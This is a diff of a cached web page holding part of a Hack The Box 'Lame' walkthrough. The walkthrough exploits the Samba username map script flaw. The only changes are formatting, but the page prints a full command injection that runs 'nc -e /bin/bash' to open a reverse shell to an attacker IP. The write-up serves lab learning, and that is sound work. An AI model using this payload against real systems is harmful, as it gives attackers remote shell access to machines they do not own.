@@ -1,4 +1,4 @@
-I"t<p><strong>DIGEST</strong></p>
+I"�<p><strong>DIGEST</strong></p>
 
 <p>An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It’s vulnerable to the “Samba username map script” vulnerability and exploited using both Manual command and Metasploit module.</p>
 
@@ -102,7 +102,7 @@
 <p>Log in as an anonymous user via smbclient. Listen on port 4444 and run the below script to get a reverse shell.</p>
 
 <blockquote>
-  <p>logon “./=<code class="highlighter-rouge">nohup nc -e /bin/bash 10.10.14.18 4444</code>”</p>
+  <p>logon “./=<code class="language-plaintext highlighter-rouge">nohup nc -e /bin/bash 10.10.14.18 4444</code>”</p>
 </blockquote>
 
 <p><img src="../../../../img/htb/lame/lame-manual1.png" alt="Manual" /></p>
